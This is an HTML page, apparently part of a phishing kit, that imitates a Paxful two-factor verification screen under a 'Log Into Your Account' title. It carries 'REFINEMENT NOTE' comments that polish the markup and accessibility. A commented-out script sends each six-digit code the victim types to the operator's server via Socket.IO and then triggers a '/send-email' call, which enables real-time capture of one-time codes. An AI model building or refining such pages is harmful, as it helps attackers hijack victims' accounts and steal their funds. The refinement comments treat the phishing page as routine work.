<!-- REFINEMENT NOTE: Original PAX_V.html had a large inline script. This will be moved to PAX_V.js -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log Into Your Account | Paxful</title> <!-- REFINEMENT NOTE: Title looks like a 2FA page, not login. "Verify Your Account" or similar might be more accurate. Keeping original. -->
    <link rel="icon" href="https://uploads.onecompiler.io/42n876cmq/439pcdkr6/images.png" type="image/png">
    <link rel="stylesheet" href="PAX_V.css">
    <script src="/socket.io/socket.io.js"></script>
</head>
<body>
    <div class="verify-container">
        <div class="container">
            <div class="header">
                <img src="https://uploads.onecompiler.io/42n876cmq/439nez9kf/unnamed.png" alt="Paxful Logo" width="30"> <!-- REFINEMENT: Improved alt text -->
                <span class="logo-text">paxful</span> <!-- REFINEMENT: Changed class from 'logo' to avoid conflict with other .logo classes if any, and be more specific -->
            </div>
            <div class="back-button" onclick="goBack()" role="button" tabindex="0"> <!-- REFINEMENT: Changed class, added ARIA roles -->
                <span class="back-icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left "><path d="m15 18-6-6 6-6"></path></svg></span> Back
            </div>
            <h2 class="verification-heading">Verification</h2> <!-- REFINEMENT: Changed class -->
            
            <!-- REFINEMENT NOTE: The email address below is hardcoded.
                 In a real application, this should be dynamically filled with the user's actual email
                 (e.g., retrieved from localStorage after login or passed as a query parameter).
                 This is a significant functional improvement beyond simple refinement. -->
            <p class="authenticator-info">Enter the 6-digit code from the authenticator app associated with your account:
               <strong id="userEmailDisplay"></strong> <!-- REFINEMENT: Added ID for potential dynamic update -->
            </p>
            
            <form id="otpForm"> <!-- REFINEMENT: Added form element for better structure -->
                <label for="otp-input-0">Confirmation Code</label> <!-- REFINEMENT: 'for' attribute points to first input -->
                <div class="otp-container" id="passcode">
                    <!-- REFINEMENT: Removed oninput from HTML, will be handled in PAX_V.js. Added aria-label and id. -->
                    <input type="text" class="otp-input" maxlength="1" id="otp-input-0" aria-label="OTP digit 1" autocomplete="off">
                    <input type="text" class="otp-input" maxlength="1" id="otp-input-1" aria-label="OTP digit 2" autocomplete="off">
                    <input type="text" class="otp-input" maxlength="1" id="otp-input-2" aria-label="OTP digit 3" autocomplete="off">
                    <input type="text" class="otp-input" maxlength="1" id="otp-input-3" aria-label="OTP digit 4" autocomplete="off">
                    <input type="text" class="otp-input" maxlength="1" id="otp-input-4" aria-label="OTP digit 5" autocomplete="off">
                    <input type="text" class="otp-input" maxlength="1" id="otp-input-5" aria-label="OTP digit 6" autocomplete="off">
                </div>
                <p id="error-message" class="error-message" aria-live="assertive"></p> <!-- REFINEMENT: Added aria-live -->
            </form>
        </div>
        
        <div class="cover-image" role="img" aria-label="Decorative background image"></div> <!-- REFINEMENT: Added role and aria-label -->
    </div>

    <!--
    REFINEMENT NOTE: Original inline script for Socket.IO and sendMessage:
    <script>
        const socket = io();
        const otpInputs = document.querySelectorAll(".otp-input");
        otpInputs.forEach((input) => {
            input.addEventListener("input", () => {
                let otpValue = Array.from(otpInputs).map(input => input.value).join("");
                if (otpValue.length === otpInputs.length) {
                    socket.emit("otpEntered", { field: "otp", value: otpValue });
                    sendMessage(); // Original call
                }
            });
        });

        async function sendMessage() {
            try {
                const response = await fetch('/HEXYO.html');
                const text = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(text, "text/html");
                const message = doc.getElementById('displayArea').textContent.trim();

                const res = await fetch('/send-email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message })
                });
                const data = await res.json(); // Assumed server sends JSON with 'message'
                alert(data.message); // Original alert
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }
    </script>
    This logic will be moved to PAX_V.js.
    -->

    <script src="PAX_V.js" defer></script> <!-- REFINEMENT: Added defer -->
</body>
</html>